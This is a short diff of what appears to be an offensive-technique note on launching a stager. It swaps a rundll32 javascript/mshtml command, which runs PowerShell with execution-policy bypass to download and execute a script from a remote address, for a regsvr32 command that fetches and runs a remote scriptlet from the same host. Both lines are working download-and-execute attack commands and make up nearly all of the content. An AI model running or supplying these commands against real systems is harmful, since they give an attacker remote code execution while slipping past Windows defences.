@@ -29,7 +29,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 #### *Execution Technique:* 
 ```markdown
 # Executing Stager with regsvr32.exe
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.254.252.3:8000/setup.ps1');")
+regsvr32 /s /n /u /i:http://10.254.252.3:8000/config.sct scrobj.dll
 ```
 
 ---
